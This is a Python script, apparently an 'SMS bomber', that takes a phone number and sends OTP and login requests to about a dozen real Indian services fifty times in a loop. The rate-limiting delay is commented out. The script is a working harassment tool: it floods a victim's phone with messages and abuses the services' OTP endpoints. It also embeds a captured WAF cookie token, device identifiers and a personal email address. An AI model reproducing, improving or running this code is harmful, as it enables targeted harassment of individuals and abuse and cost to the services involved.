import requests
import time

def smsg(number):
    number = str(number)
    
    # List of APIs with their corresponding URLs and payloads
    apis = [
        {
            "url": "https://services.dealshare.in/userservice/api/v1/send-otp",
            "method": "POST",
            "headers": {
                "Host": "services.dealshare.in",
                "accept": "application/json, text/plain, */*",
                "accept-language": "en",
                "lang": "en",
                "appversion": "1.2.3",
                "cpversion": "1",
                "deviceid": "c7abc1fd7459e84c",
                "ab-config": '{"mov_experiment":"default","ranking_experiment":"default"}',
                "channel": "APP",
                "businessmodel": "B2C",
                "source": "app",
                "phone": number,
                "buefdnwdei": "true",
                "cookie": "aws-waf-token=a5ffde2b-247c-4646-8ef7-de725acda409:BQoAYFF2lWjZAAAA:TsB/U18rxapg6HuWJGLtZMGYNi8MGTcZSNhOmYDACQWtuwA09eVxbdqRKmTJ/Pk4jWOCpEEdPeh0jWsZrOlMfcw85hHjDUKo8KL+ykw7h/c6uuZLRG56clT8DZKb",
                "x-datadog-origin": "rum",
                "x-datadog-sampling-priority": "1",
                "x-datadog-trace-id": "6507793470672644027",
                "x-datadog-parent-id": "4042424383694315747",
                "content-type": "application/json",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {
                "phoneNumber": number,
                "name": number,
                "hashCode": "k387IsBaTmn",
                "resendOtp": 0,
                "source": "app",
                "loginType": "OTP",
                "deviceId": "c7abc1fd7459e84c"
            }
        },
        
        {
            "url": "https://api.yellowplate.in/api/sms/otp/registerAndSendOtp",
            "method": "POST",
            "headers": {
                "Host": "api.yellowplate.in",
                "Connection": "keep-alive",
                "applicationId": "com.indiataxi.amit.consumerapp",
                "apiToken": "null",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007)"
            },
            "data": {
                "phoneNumber": number,
                "name": "Shiv",
                "email": "shivamrajt662006@gmail.com",
                "userType": "CUSTOMER"
            }
        },
        {
            "url": f"https://api.yellowplate.in/api/sms/otp/sendOTPForCustomer?phoneNumber={number}",
            "method": "GET",
            "headers": {
                "Host": "api.yellowplate.in",
                "applicationId": "com.indiataxi.amit.consumerapp",
                "apiToken": "null",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007)"
            }
        },
        {
            "url": "https://indiacements.mloyalretail.com/m/forgot_pswd.asp",
            "method": "POST",
            "headers": {
                "Host": "indiacements.mloyalretail.com",
                "content-length": "19",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-E5260 Build/UP1A.231005.007)"
            },
            "data": {
                "mobileno": number
            }
        },
        {
            "url": "https://apps.abacusdesk.com/max_cement/dd_api/app_karigar/karigarLoginOtp",
            "method": "POST",
            "headers": {
                "Host": "apps.abacusdesk.com",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-E5260 Build/UP1A.231005.007)"
            },
            "data": {
                "mobile_no": number
            }
        },
        {
            "url": "https://serviceacc.adani.com/customerportal-webservices/controller/userRegistrationService/sendOTPForNewUser",
            "method": "POST",
            "headers": {
                "Host": "serviceacc.adani.com",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-E5260 Build/UP1A.231005.007)"
            },
            "data": {
                "companyId": "1",
                "mobileNumber": number
            }
        },
        {
            "url": "https://t.rummycircle.com/api/fl/auth/v3/getOtp",
            "method": "POST",
            "headers": {
                "content-type": "application/json"
            },
            "data": {
                "mobile": number,
                "deviceId": "f4ef81aa-b1a6-4840-99ef-4288a8b10e25",
                "deviceName": "",
                "refCode": "",
                "isPlaycircle": False
            }
        },
        {
            "url": "https://m.snapdeal.com/sendOTP",
            "method": "POST",
            "headers": {
                "content-type": "application/json"
            },
            "data": {
                "mobileNumber": number,
                "purpose": "LOGIN_WITH_MOBILE_OTP"
            }
        },
        {
            "url": "https://app-api.crickpe.org/api/v1/auth/loginRegister",
            "method": "POST",
            "headers": {
                "Host": "app-api.crickpe.org",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "okhttp/5.0.0-alpha.2"
            },
            "data": {
                "mobileNo": number
            }
        },
        {
            "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
            "method": "POST",
            "headers": {
                "content-type": "application/json",
                "accept": "application/json"
            },
            "data": {
                "country_code": "91",
                "locale": "IN",
                "mobile": number
            }
        },
        
        {
            "url": "https://www.lockthedeal.com/api/mobile/otp.json",
            "method": "POST",
            "headers": {
                "content-type": "application/json"
            },
            "data": {
                "mobile": number,
                "otpInResponse": False
            }
        },
        {
            "url": "https://oneway.cab/ajax/capcha_ajax.php",
            "method": "POST",
            "headers": {
                "content-type": "application/x-www-form-urlencoded"
            },
            "data": {
                "action": "login_otp",
                "mobile": number,
                "countryCode": "91"
            }
        }
    ]
    
    # Run the requests for 50 iterations
    for _ in range(50):
        for api in apis:
            try:
                if api["method"] == "POST":
                    response = requests.post(api["url"], json=api["data"], headers=api["headers"])
                elif api["method"] == "GET":
                    response = requests.get(api["url"], headers=api["headers"])
                print(f"Request to {api['url']} - Status Code: {response.status_code}")
            except Exception as e:
                print(f"Error during request to {api['url']}: {e}")
        # Add a delay of 10 seconds between requests
      #  time.sleep(10)

# Example # Replace with the actual phone number you want to use
